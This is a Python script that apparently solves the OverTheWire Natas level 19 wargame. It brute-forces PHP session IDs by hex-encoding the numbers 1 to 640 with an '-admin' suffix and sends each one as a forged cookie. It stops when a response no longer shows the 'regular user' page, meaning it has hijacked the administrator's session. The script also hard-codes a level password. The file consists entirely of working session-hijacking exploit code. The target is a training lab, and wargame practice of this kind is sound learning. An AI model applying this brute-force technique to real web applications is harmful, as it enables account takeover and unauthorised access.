#!/usr/bin/env python3
import requests

auth=("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
for i in range(1, 641):
    print(i)
    PHPSESSID = bytes(str(i), 'ascii').hex() + b'-admin'.hex()
    headers={'Cookie': 'PHPSESSID=%s' % PHPSESSID}
    r = requests.post('http://natas19.natas.labs.overthewire.org/index.php?debug', auth=auth, headers=headers)
    if not 'regular user' in r.text:
        print(r.text)
        break
